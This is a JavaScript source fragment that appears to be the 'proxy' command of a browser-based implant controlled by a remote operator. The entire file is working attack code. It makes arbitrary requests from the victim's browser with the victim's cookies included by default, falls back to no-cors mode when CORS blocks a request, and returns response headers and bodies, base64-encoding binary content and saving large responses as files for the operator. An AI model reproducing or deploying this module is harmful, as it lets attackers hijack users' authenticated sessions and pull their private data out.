COMMANDS['proxy'] = async function(task) {
    var params = parseParams(task);
    var url = (params && params.url) ? params.url : '';
    var method = (params && params.method) ? params.method.toUpperCase() : 'GET';
    var headers = (params && params.headers) ? params.headers : {};
    var body = (params && params.body) ? params.body : null;
    var credentials = (params && params.credentials) ? params.credentials : 'include';

    if (!url) return JSON.stringify({error: 'url parameter required'}, null, 2);

    // Parse headers if passed as string
    if (headers && typeof headers === 'string') {
        try { headers = JSON.parse(headers); } catch (e) { headers = {}; }
    }

    var fetchOpts = {
        method: method,
        credentials: credentials,
        redirect: 'follow'
    };

    // Set headers if provided
    if (headers && typeof headers === 'object' && Object.keys(headers).length > 0) {
        fetchOpts.headers = headers;
    }

    // Set body for non-GET/HEAD requests
    if (body && method !== 'GET' && method !== 'HEAD') {
        if (typeof body !== 'string') body = JSON.stringify(body);
        fetchOpts.body = body;
        // Auto-detect JSON content type
        if (body[0] === '{' && !headers['Content-Type'] && !headers['content-type']) {
            fetchOpts.headers = fetchOpts.headers || {};
            fetchOpts.headers['Content-Type'] = 'application/json';
        }
    }

    var startTime = Date.now();
    var usedNoCors = false;

    try {
        var resp;
        try {
            resp = await fetch(url, fetchOpts);
        } catch (e) {
            // CORS failure — retry with no-cors (will get opaque response)
            fetchOpts.mode = 'no-cors';
            resp = await fetch(url, fetchOpts);
            usedNoCors = true;
        }
        var elapsed = Date.now() - startTime;

        // Collect response headers
        var respHeaders = {};
        try {
            resp.headers.forEach(function(value, key) {
                respHeaders[key] = value;
            });
        } catch (e) {}

        var contentType = resp.headers.get('content-type') || '';
        var respBody = '';
        var isBinary = false;

        // Handle opaque no-cors responses
        if (usedNoCors) {
            try {
                respBody = await resp.text();
            } catch (e) {
                respBody = '(opaque response — no-cors mode, response body not accessible)';
            }
        } else if (contentType.match(/image|audio|video|octet-stream|pdf|zip|gzip/i)) {
            // Handle binary responses
            var buf = await resp.arrayBuffer();
            var bytes = new Uint8Array(buf);
            var binary = '';
            for (var i = 0; i < bytes.length; i++) {
                binary += String.fromCharCode(bytes[i]);
            }
            respBody = btoa(binary);
            isBinary = true;
        } else {
            respBody = await resp.text();
        }

        var result = {
            url: resp.url,
            status: resp.status,
            statusText: resp.statusText,
            redirected: resp.redirected,
            headers: respHeaders,
            body: respBody,
            binary: isBinary,
            contentType: contentType,
            elapsed: elapsed + 'ms',
            bodySize: respBody.length,
            noCors: usedNoCors
        };

        // If response is large, offer to download as file
        if (respBody.length > 100000) {
            var ext = contentType.split('/')[1] || 'bin';
            ext = ext.split(';')[0].trim();
            var filename = 'proxy_response.' + ext;
            var fileData = isBinary ? respBody : btoa(unescape(encodeURIComponent(respBody)));
            var fileId = await downloadFile(task.id, filename, fileData, false);
            result.file_id = fileId;
            result.body = '(large response saved as file, ' + respBody.length + ' bytes)';
        }

        return JSON.stringify(result, null, 2);

    } catch (e) {
        return JSON.stringify({
            url: url,
            method: method,
            error: e.message,
            elapsed: (Date.now() - startTime) + 'ms',
            hint: 'Request failed. Possible causes: CORS policy, network error, CSP connect-src restriction, or mixed content (HTTPS page to HTTP URL).'
        }, null, 2);
    }
};
